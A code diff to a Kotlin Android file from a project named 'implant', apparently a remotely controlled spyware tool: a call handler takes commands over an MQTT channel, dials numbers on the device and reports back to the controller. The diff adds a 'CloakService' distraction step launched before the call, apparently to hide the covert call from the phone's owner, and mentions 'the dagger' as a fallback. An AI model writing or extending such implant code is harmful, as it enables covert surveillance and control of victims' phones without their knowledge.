@@ -6,6 +6,7 @@ import android.content.Intent
 import android.content.pm.PackageManager
 import android.net.Uri
 import android.support.v4.content.ContextCompat
+import com.cooperthecoder.implant.cloak.CloakService
 import com.cooperthecoder.implant.command.Command
 import org.eclipse.paho.android.service.MqttAndroidClient
 
@@ -25,11 +26,15 @@ class CallHandler(context: Context, client: MqttAndroidClient, command: Command)
             phoneNumber = "${PREFIX}$phoneNumber"
         }
 
-        val intent = Intent(Intent.ACTION_CALL)
-        intent.setData(Uri.parse(phoneNumber))
+        val distractionIntent = Intent(context, CloakService::class.java)
+        distractionIntent.action = CloakService.ACTION_DISTRACTION
+        context.startService(distractionIntent)
+
+        val phoneCallIntent = Intent(Intent.ACTION_CALL)
+        phoneCallIntent.setData(Uri.parse(phoneNumber))
         if (ContextCompat.checkSelfPermission(context, Manifest.permission.CALL_PHONE) == PackageManager.PERMISSION_GRANTED) {
             reply("Dialing $phoneNumber", "")
-            context.startActivity(intent)
+            context.startActivity(phoneCallIntent)
         } else {
             reply("", "Phone permission has not been granted. Try using the dagger")
         }
